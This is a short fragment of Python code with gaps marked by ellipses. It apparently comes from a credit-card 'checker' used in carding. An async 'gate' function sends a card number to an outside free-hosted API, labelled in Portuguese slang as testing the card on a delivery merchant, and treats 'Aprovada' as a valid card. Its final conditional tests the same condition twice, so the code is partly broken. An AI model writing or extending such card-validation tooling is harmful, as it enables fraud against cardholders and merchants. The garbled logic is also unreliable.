...
async def gatejoker(card: str) -> Tuple[Optional[bool], str]:
    gate = "joker"
    print(f"[GATE_{gate}][{card}] Estrupando a cc na AmoDelivery...")
    token = "joker"
    try:
        rt = await hc.get(
            f"https://chkitauvigarista.000webhostapp.com/api.php?lista=",
    ...
    rcode = True if 'Aprovada' in rj else False if 'Aprovada' in rj else None
